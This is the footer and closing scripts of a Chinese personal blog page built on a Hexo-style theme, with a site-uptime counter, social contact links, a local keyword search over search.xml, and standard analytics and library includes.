                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:3257962529@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3257962529" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3257962529" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
